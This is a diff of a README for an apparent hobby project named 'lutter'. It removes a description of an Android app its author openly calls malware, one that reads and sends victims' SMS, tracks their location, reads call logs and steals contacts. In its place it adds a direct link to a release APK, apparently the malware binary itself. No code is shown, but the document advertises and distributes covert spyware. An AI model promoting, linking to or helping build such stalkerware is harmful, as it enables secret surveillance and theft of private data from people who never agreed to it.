@@ -1,7 +1,1 @@
-# Project lutter
-
-This is a hobby project i have been working on for a while now.
-
-Its basically an android app/malware.It gives access to any phone it is installed on.
-You can do a bunch of neat stuff such as :reading victims sms,send sms from victims phone,see their location and call logs,
-steal their contacts
+https://api.codemagic.io/artifacts/2c00ff20-10a0-43f6-92b6-29d4704e5f55/4302aa4c-ffa0-4922-9e74-85d535f232f7/app-release.apk
